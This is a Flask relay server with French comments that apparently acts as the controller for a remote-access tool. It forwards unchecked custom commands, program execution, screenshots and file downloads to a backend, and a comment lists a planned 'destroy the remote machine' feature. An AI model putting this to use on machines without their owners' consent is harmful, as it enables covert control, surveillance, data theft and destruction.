from flask import Flask
from flask import request
import requests
from flask_cors import CORS
import datetime
import json
import os


HOST = "localhost"
BASE_URL = f"http://{HOST}:12001"


app = Flask(__name__)
CORS(app)

# obtenir le repertoire courant
@app.route("/get_current_dir", methods=["POST", "GET"])
def navigate():
    # try:
    result = requests.get(f"{BASE_URL}/get_current_dir")
    print(result.content.decode())
    return result.content


# aller dans un dossier
@app.route("/go_dir", methods=["POST", "GET"])
def go_dir():
    r = request.get_data()
    if r.decode("utf-8")[-1] == "@":
        print(r.decode("utf-8")[-1])
        return json.dumps(r.decode('utf-8') + " n'est pas un dossier, imposible de naviguer dedans.")
    r = requests.get(f"{BASE_URL}/go_dir", data=r)
    return r.content


# aller dans le dossier parent
@app.route("/go_back", methods=["POST", "GET"])
def go_back():
    # try:
    result = requests.get(f"{BASE_URL}/go_back")
    print(result.content.decode())
    return result.content


# executer un programme
@app.route("/execute", methods=["POST", "GET"])
def execute():
    r = request.get_data()
    if "@" not in r.decode("utf-8"):
        response = f"{r.decode('utf-8')} n'est pas un programme, impossible de l'executer."
        return response
    filename = r.decode("utf-8")[:-1]
    r = requests.get(f"{BASE_URL}/execute", data=filename)
    return r.content


# commande custom
@app.route("/custom", methods=["POST", "GET"])
def custom():
    r = request.get_data()
    command = r.decode("utf-8")
    r = requests.get(f"{BASE_URL}/custom", data=command)
    return r.content
    

# screenshot
@app.route("/screenshot", methods=["POST", "GET"])
def screeshot():
    filename = "Capture_" + datetime.datetime.strftime(datetime.datetime.now(), "%d-%m-%Y_%Hh%Mm%Ss") + ".png"
    # try:
    image = requests.get(f"{BASE_URL}/screenshot")
    # Chemin du dossier contenant le script actuel
    print(image.content)
    base_dir = "../../../\\fichiers reçus\\"
    dir = base_dir + filename
    f = open(dir, "wb")
    f.write(image.content)
    f.close()
    return f"{filename} enregistré avec succès! DESTINATION: {dir}"
    # except:
    #     return "Erreur lors de la capture d'écran"


# download
@app.route("/download", methods=["POST", "GET"])
def download():
    try:
        r = request.get_data()
        print(r.decode("utf-8"))
        filename = r.decode("utf-8")
        if filename[-1] != "@":
            return json.dumps(f"'{filename}' n'est pas un fichier, veillez télécharger un fichier à la fois.")
        base_dir = "../../../\\fichiers reçus\\"
        dir = base_dir + filename.split("\\")[-1][:-1]
        print("1")
        result = requests.get(f"{BASE_URL}/download", data=r)
        f = open(dir, "wb")
        f.write(result.content)
        f.close()
        return json.dumps(f'{filename[:-1]} télécharger{result.content.decode("utf-8")}')
    except Exception as e:
        return json.dumps(str(e))


if __name__ == "__main__":
    app.run(host="localhost", port=12000) 




# télécharger un fichier

# Executer un fichier

# Aller dans un répertoire et revenir en arrière

# prendre une capture d'écran

# détruire la machine distante

# envoyer une ligne de commande custom

# screenshot